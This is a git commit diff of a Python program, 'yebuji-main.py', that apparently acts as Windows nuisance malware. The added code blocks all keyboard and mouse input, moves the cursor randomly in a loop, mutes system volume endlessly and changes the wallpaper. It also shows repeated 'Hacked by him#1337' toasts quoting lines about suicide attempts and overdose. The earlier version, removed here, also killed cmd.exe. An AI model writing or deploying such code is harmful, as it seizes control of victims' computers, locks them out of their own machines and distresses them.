f9ac8467826f830e061bb5c8f89c2c70f529a774
him technology <130269588+him114514@users.noreply.github.com>
2025-04-19 09:39:20 +0800

    Update yebuji-main.py

--- yebuji-main.py
+++ yebuji-main.py
@@ -3,12 +3,41 @@ import ctypes
 import pygame
 import threading
 import random
+from ctypes import cast, POINTER
+import win32api
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from win10toast import ToastNotifier
+import time
+
 ctypes.windll.user32.SystemParametersInfoW(20, 0, resource.folder+'desktop.png' ,3)
 
-def setMouse():
-    while True:
-        win32api.SetCursorPos((random.randint(0,900),random.randint(0,900)))
-        os.system('taskkill /f /im cmd.exe')
+class Threadlib:
+    devices = AudioUtilities.GetSpeakers()
+    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+    volume = cast(interface, POINTER(IAudioEndpointVolume))
+    text = ["暇つぶした自殺未遂 嘔吐した真昼間のオーバードーズ",
+            "おなかもよう晴れのち雨 落ち着かない真夜中の精神統一",
+            "うんこが け陰毛 パスタ 胎児のドブ漬けゲロ風味",
+            "布団潜ればまっくらのやみ 月曜日のメンタル逆エベレスト"]
+    @staticmethod
+    def setMouse():
+        while True:
+            win32api.SetCursorPos((random.randint(0,900),random.randint(0,900)))
+            
+    @staticmethod
+    def keepkeyboard():
+        ctypes.windll.user32.BlockInput(True)
+    @staticmethod
+    def setwave():
+        while True:
+            Threadlib.volume.SetMasterVolumeLevel(0, None)
+    @staticmethod
+    def sendmessage():
+        toaster = ToastNotifier()
+        while True:
+            toaster.show_toast("Hacked by him#1337", text[random.randint(0,3)])
+            time.sleep(random.randint(10,100))
 
 def show():
     pygame.init()
@@ -25,11 +54,20 @@ def show():
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
                 pass
-def keepkeyboard():
-    ctypes.windll.user32.BlockInput(True)
+
+
+def threads_item():
+    th=[]
+    for name ,items in Threadlib.__dict__.items():
+        if isinstance(items ,staticmethod):
+           
+            exec("th.append("+"Threadlib."+name+")")
+    return th
+
+
+th = threads_item() #[Threadlib.keepkeyboard ,Threadlib.setMouse,Threadlib.setwave]
 if __name__ == "__main__":
-    K = threading.Thread(target=keepkeyboard)
-    K.start()
-    T = threading.Thread(target=setMouse)
-    T.start()
+    for t in th:
+        threading.Thread(target=t).start()
+
     show()
